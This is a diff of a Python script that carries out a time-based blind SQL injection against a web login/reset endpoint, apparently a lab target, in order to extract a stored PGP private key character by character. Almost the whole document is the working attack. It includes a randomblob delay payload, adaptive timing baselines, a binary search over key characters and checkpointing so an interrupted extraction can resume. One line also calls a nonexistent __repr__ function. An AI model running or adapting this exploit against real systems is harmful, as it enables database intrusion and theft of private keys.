@@ -2,128 +2,196 @@ import time
 from statistics import median
 import requests
 from loguru import logger
+import os
 
 API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
 API_RUNS = 100
 THRESHOLD_SECONDS = 2.0  # Safe gap for differential timing
 
 def check_payload_true(known_user, sql_payload, threshold):
-    # 1. Get a Stable Baseline
-    # We loop until the server responds in under 10 seconds to ensure we aren't
-    # testing against a massive queue which causes False Positives.
-    baseline_time = 10  # Start high to enter loop
-    retries = 0
+    # 1. Dynamic Baseline (Adaptive)
+    # Instead of waiting for < 0.35s, we take the median of 3 probes
+    # to find out what "normal" is RIGHT NOW.
+    baseline_probes = []
+    for _ in range(3):
+        t = measure_response_time(API_URL, known_user)
+        baseline_probes.append(t)
     
-    while baseline_time > 0.35:  # If baseline is above 350ms, we consider the server congeste
-        if retries > 0:
-            logger.warning(f"⚠️ Server congested (Lag: {baseline_time:.2f}s). Retrying for stable baseline...")
-            time.sleep(10) # Let the server breathe for a moment
-            
-        baseline_time = measure_response_time(API_URL, known_user)
-        retries += 1
-        
-
+    # Use median to ignore random spikes
+    baseline_time = median(baseline_probes)
 
     # 2. Measure the Injection Time
-    injection_time = measure_response_time(API_URL, sql_payload)
-    
-    # 3. Calculate the ACTUAL delay caused by SQL (Injection - Baseline)
-    actual_delay = injection_time - baseline_time
+    injection_times = []
+    for attempt in range(5): 
+        injection_time = measure_response_time(API_URL, sql_payload)
+        injection_times.append(injection_time)
+        
+        # Optimization: If response is faster than baseline + threshold, 
+        # it definitely didn't trigger the delay. Return False early.
+        if injection_time < (baseline_time + threshold): 
+             return False
+
+    # 3. Calculate the ACTUAL delay
+    # We use max() to be generous to the injection attempt
+    max_injection = max(injection_times)
+    actual_delay = max_injection - baseline_time
     
     boolean_result = actual_delay > threshold
-    # Debugging
-    logger.debug(f"Base: {baseline_time:.2f}s | Inj: {injection_time:.2f}s | Diff: {actual_delay:.2f}s |boolean: {boolean_result}")
+    
+    # Log only if interesting (True or close call)
+    if boolean_result or actual_delay > (threshold / 2):
+        logger.debug(f"Base: {baseline_time:.2f}s | Inj: {max_injection:.2f}s | Diff: {actual_delay:.2f}s | Result: {boolean_result}")
 
-    # If the difference is significant (> 2.0s), it's a TRUE
     return boolean_result
 
 
 def build_sql_payload(condition):
+    # Randomblob delay for SQLite
+    delay_size = 250000000  
+    
     return {
-        "username": "admin' AND (CASE WHEN (" + condition + ") THEN (SELECT sum(x) FROM (WITH RECURSIVE cnt(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM cnt WHERE x<8000000) SELECT x FROM cnt)) ELSE 0 END) like '1"}
-
-# def measure_average_response_time(url, input):
-#     request_times = []
-#     for run in range(API_RUNS):
-#         start = time.perf_counter()
-#         r = requests.post(f"{url}", data=input)
-#         end = time.perf_counter()
-#         request_times.append(end - start)
-#     avg_reponse_time = median(request_times)
-#     logger.info(f"Run Average Time: {avg_reponse_time} for input: {input} \n")
-#     return avg_reponse_time
+        "username": f"admin' AND (CASE WHEN ({condition}) THEN (abs(randomblob({delay_size}))) ELSE 0 END) --"
+    }
 
 def measure_response_time(url, input):
-    start = time.perf_counter()
-    r = requests.post(f"{url}", data=input)
-    end = time.perf_counter()
-    reponse_time = end - start
-    return reponse_time
+    try:
+        start = time.perf_counter()
+        r = requests.post(f"{url}", data=input, timeout=30) 
+        end = time.perf_counter()
+        return end - start
+    except requests.RequestException as e:
+        logger.error(f"Request failed: {e}")
+        return 0.0
 
 def discover_char(known_user, key_index):
-    low, high = 32, 126  # ASCII printable range
-    # Binary search to find the character at key_index
-    while low <= high:
-        mid = (low + high) // 2
-        condition = f"substr(key,{key_index + 1},1)>'{chr(mid)}'"
-        sql_payload = build_sql_payload(condition)
-        
-        # Pass average_reponse_time (ignored inside, but kept for signature compatibility)
-        char_is_higher = check_payload_true(known_user, sql_payload, THRESHOLD_SECONDS)
-
-        if char_is_higher:
-            low = mid + 1
-        else:
-            high = mid - 1
+    # 1. Define the specific PGP ASCII Armor + Header character set
+    # We use a set to automatically handle duplicates and then sort it.
+    valid_chars = sorted(list(set(
+        [10, 13] +                       # Control: \n (10), \r (13)
+        [32] +                           # Space (32)
+        [43, 46, 47, 45] +               # Symbols: + (43), . (46), / (47), - (45)
+        [58, 61] +                       # Header/Padding: : (58), = (61)
+        list(range(48, 58)) +            # Numbers: 0-9
+        list(range(65, 91)) +            # Uppercase: A-Z
+        list(range(97, 123))             # Lowercase: a-z
+    )))
     
-    return chr(low)
+    # Note: I also added '-' (45) above because Version strings often use it 
+    # (e.g., "GnuPG v1.4-beta") or it might appear in comments.
+
+    while True:
+        # Search through the INDICES of valid_chars
+        low_idx = 0
+        high_idx = len(valid_chars) - 1
+
+        while low_idx <= high_idx:
+            mid_idx = (low_idx + high_idx) // 2
+            mid_val = valid_chars[mid_idx]
+
+            # Binary search comparison
+            condition = f"unicode(substr(key,{key_index + 1},1))>{mid_val}"
+            sql_payload = build_sql_payload(condition)
+
+            if check_payload_true(known_user, sql_payload, THRESHOLD_SECONDS):
+                low_idx = mid_idx + 1
+            else:
+                high_idx = mid_idx - 1
+        
+        # Fuzzy Verification: Check the result + neighbors
+        candidates_indices = [low_idx, low_idx - 1, low_idx + 1]
+        
+        for idx in candidates_indices:
+            # Ensure index is within bounds of our list
+            if idx < 0 or idx >= len(valid_chars):
+                continue
+            
+            cand_ascii = valid_chars[idx]
+            candidate_char = chr(cand_ascii)
+            
+            verify_condition = f"unicode(substr(key,{key_index + 1},1))={cand_ascii}"
+            verify_payload = build_sql_payload(verify_condition)
+            
+            if check_payload_true(known_user, verify_payload, THRESHOLD_SECONDS):
+                return candidate_char
+
+        logger.warning(f"[-] Verification failed for index {key_index}. Retrying...")
+        
+
 
 def sql_injection_attack():
     logger.info(f"Starting SQL Injection Attack against the API at {API_URL}")
-    #logger.info("Measuring average response time for known user...")
     known_user = {"username": "admin"}
-  
+    
     prefix = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
     suffix = "-----END PGP PRIVATE KEY BLOCK-----"
+    file_path = "extracted_key.txt"
     
-    # We still calculate this for logging, though check_payload_true calculates its own baseline now
-    #average_response_time = measure_average_response_time(API_URL, known_user)
-    
-    prefix_payload = build_sql_payload(f"substr(key,1,{len(prefix)})='{prefix}'")
-    logger.info("Checking if the key starts with the expected PGP header...")
-    if (check_payload_true(known_user, prefix_payload, THRESHOLD_SECONDS)):
-        logger.info("✅ Prefix check passed")
-    else:
-        logger.warning("❌ Prefix check failed. The key does not start with the expected PGP header. Aborting attack.")
-        exit(1)
+    # Variable to hold the starting point (defaults to just the prefix)
+    current_key = prefix
+    is_resuming = False
 
-    key = prefix
-    key_index = len(prefix)  
+    # --- 1. CHECKPOINT VALIDATION ---
+    if os.path.exists(file_path):
+        logger.info(f"Found checkpoint file: {file_path}")
+        
+        with open(file_path, "r") as f:
+            checkpoint_data = f.read()
+
+        # Sanity check: It must at least start with the PGP header
+        if checkpoint_data.startswith(prefix):
+            
+            # Condition: Does the DB key match our file exactly so far?
+            # substr(key, 1, length) = 'file_content'
+            condition = f"substr(key,1,{len(checkpoint_data)})='{checkpoint_data}'"
+            payload = build_sql_payload(condition)
+
+            logger.info(f"Verifying checkpoint integrity ({len(checkpoint_data)} chars)...")
+            
+            if check_payload_true(known_user, payload, THRESHOLD_SECONDS):
+                logger.success("✅ Checkpoint validated! Resuming from saved state.")
+                current_key = checkpoint_data
+                is_resuming = True
+            else:
+                logger.warning("❌ Checkpoint validation failed (DB mismatch). Restarting from scratch.")
+        else:
+            logger.warning("⚠️ Checkpoint file corrupted (wrong header). Restarting from scratch.")
+
+    # --- 2. FALLBACK: PREFIX VALIDATION ---
+    # Only check the prefix if we aren't already resuming from a valid checkpoint
+    if not is_resuming:
+        prefix_payload = build_sql_payload(f"substr(key,1,{len(prefix)})='{prefix}'")
+        logger.info("Checking if the key starts with the expected PGP header...")
+        
+        if check_payload_true(known_user, prefix_payload, THRESHOLD_SECONDS):
+            logger.info("✅ Prefix check passed")
+        else:
+            logger.error("❌ Prefix check failed. The key does not start with the expected PGP header. Aborting attack.")
+            exit(1)
+
+    # --- 3. START EXTRACTION ---
+    key = current_key
+    key_index = len(key)  
     
     logger.info(f"🔍 Starting key extraction at index {key_index}")
+    
     while not key.endswith(suffix):
-        # Discover the character at current index
         character = discover_char(known_user, key_index)
         key = key + character
-        
         key_index += 1
-        
-        # Log progress every 10 characters to avoid flooding the logs
-        if key_index % 10 == 0:  
-            logger.info(f"Progress: Extracted {key_index} characters so far...\n")
-            logger.info(f"Current Key: {key}\n")
+        modulo_index = key_index % 10
+        if modulo_index == 0:
+            logger.info(__repr__(f"Extracted so far: {key}"))
 
-        # Safety check to prevent infinite loop in case of unexpected issues
+        with open(file_path, "w") as f:
+            f.write(key)   
+            
         if len(key) > 5000:
-            logger.warning("Stopping: Key exceeded 5000 characters without finding suffix.")
+            logger.warning("\nStopping: Key exceeded 5000 characters.")
             break
 
-    logger.info(f"Key extraction completed. Final key:\n{key}\n")
-    file_path = "extracted_key.txt"
-    logger.info(f"Saving key to {file_path}...")
+    logger.success(f"\nKey extraction completed. Saved to {file_path}")
     with open(file_path, "w") as f:
         f.write(key)
-    logger.info(f"✅ Key saved to {file_path}")
 
 if __name__ == '__main__':
     sql_injection_attack()
